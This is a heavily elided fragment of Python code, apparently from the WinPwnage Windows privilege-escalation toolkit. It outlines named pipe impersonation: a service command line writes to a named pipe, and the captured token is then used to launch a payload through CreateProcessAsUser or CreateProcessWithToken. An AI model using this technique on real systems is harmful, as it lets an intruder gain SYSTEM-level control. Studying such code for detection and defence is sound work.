...
def Service(*args):
	...
	service_bin = r"%COMSPEC% /c ping -n 1 127.0.0.1 >nul && echo 'WinPwnage' > \\.\pipe\WinPwnagePipe"
...
def named_pipe_impersonation(payload):
	...
	if payloads().exe(payload):
		...
		if CreateProcessAsUser(hPrimaryToken, None, lpApplicationName, None, None, False, 0, None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
			...
			if CreateProcessWithToken(hPrimaryToken, 0x00000002, lpApplicationName, None, 0x00000010, None, None, byref(lpStartupInfo), byref(lpProcessInformation)) == 0:
